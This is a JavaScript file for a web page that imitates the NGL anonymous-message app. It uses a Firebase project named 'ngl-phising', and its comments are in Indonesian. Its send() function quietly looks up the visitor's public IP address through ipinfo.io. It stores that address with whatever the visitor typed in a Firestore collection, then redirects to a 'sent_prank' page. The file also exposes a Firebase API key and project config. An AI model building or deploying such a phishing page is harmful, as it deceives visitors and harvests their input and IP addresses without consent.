$(document).ready(function () {

    $('.form').submit(function (e) {
        e.preventDefault();
        $('.submit').attr('disabled', true)
        //Setting Kirim Send Button
    })


    // Hide Button
    $('textarea').focus(function () {
        $('.bottom-container').hide()
    })
    $('textarea').blur(function () {
        $('.bottom-container').show()
    })
    $('textarea').on('change keyup paste', function (e) {
        if (e.target.value == '') {
            $('.submit').hide()
        } else {
            $('.submit').show()
        }
    });
    // Hide Button
});

const firebaseConfig = {
    apiKey: "AIzaSyArTBXoSF9EIPQx1vz5YsaHgF6A0LgZLBg",
    authDomain: "ngl-phising.firebaseapp.com",
    projectId: "ngl-phising",
    storageBucket: "ngl-phising.appspot.com",
    messagingSenderId: "801979684878",
    appId: "1:801979684878:web:1a7227507ae1c81165445f"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

async function get() {
    const total = await db.collection('users').get();
    $('.clickCount').text(total.docs.length);
}
get();

async function send() {
    jQuery.get("http://ipinfo.io", function (e) {
        db.collection("username").add({
            username: $('#question').val(),
            ipAddress: e.ip,
        }).then(() => {
            console.log("Berhasil Kirim Data");
            window.location.assign("sent_prank.html");
        }).catch((e) => {
            console.error("Gagal Mengirim Data! : " + e);
        });

    }, "jsonp")
}

async function back() {
    window.location.assign("index.html");
}